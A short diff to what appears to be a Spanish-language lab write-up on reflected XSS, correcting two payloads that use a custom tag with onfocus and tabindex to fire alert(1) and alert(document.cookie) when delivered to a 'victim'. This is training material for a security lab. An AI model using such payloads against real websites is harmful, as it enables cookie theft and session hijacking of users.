@@ -33,8 +33,8 @@ Ahora, para mandarle ese script a la victima, podemos hacer lo siguiente desde e
 
 ```javascript
 <script>
-    location = 'https://burpsuite?search=<etiqueta id=identificador onfocus=alert(1) tabindex=1>#identificador</etiqueta>'
-    location = 'https://burpsuite?search=<etiqueta id=identificador onfocus=alert(document.cookie) tabindex=1>#identificador</etiqueta>'
+    location = 'https://burpsuite?search=<etiqueta id=identificador onfocus=alert(1) tabindex=1></etiqueta>#identificador'
+    location = 'https://burpsuite?search=<etiqueta id=identificador onfocus=alert(document.cookie) tabindex=1></etiqueta>#identificador'
 </script>
 ```
 
